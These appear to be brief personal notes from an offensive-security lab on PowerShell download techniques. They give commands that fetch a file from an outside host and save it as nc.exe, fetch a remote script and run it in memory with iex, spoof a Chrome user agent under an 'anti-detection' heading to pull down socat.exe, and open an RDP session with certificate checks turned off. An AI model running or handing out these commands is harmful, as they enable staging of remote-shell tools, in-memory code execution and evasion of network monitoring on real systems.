1-Detection:

Invoke-WebRequest http://192.168.0.101:8000/t.txt -OutFile "C:\Users\Public\nc.exe" 


2-Commnds on the powershell below:

$h=new-object -com WinHttp.WinHttpRequest.5.1
$h.open('GET','http://192.168.0.101:8000/t.txt',$false);
$h.send();
iex $h.ResponseText


Listing out User Agents-below:

[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

anti-detection

$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://192.168.0.101:8000/socat.exe -UserAgent $UserAgent -OutFile "C:\Users\Kostya Nikolaev\Desktop\myHash\soact.exe"


xfreerdp /u:"user" /p:"password" /v:192.168.2.2 /cert-ignore /tls-seclevel:0 /w:1400 /h:800
